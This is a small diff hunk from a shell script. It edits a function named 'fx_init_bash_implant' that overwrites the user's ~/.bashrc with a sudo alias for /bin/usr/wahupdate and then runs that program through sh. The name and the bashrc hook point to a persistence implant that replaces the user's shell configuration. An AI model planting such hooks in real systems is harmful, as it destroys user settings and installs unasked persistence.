@@ -35,7 +35,7 @@ function fx_init_bash_implant(){
         echo "alias 'wahupdate'='sudo /bin/usr/wahupdate'" > ~/.bashrc
         fx_init_bash_implant
     else
-        wahupdate
+        sh /bin/usr/wahupdate
     fi
 }
 
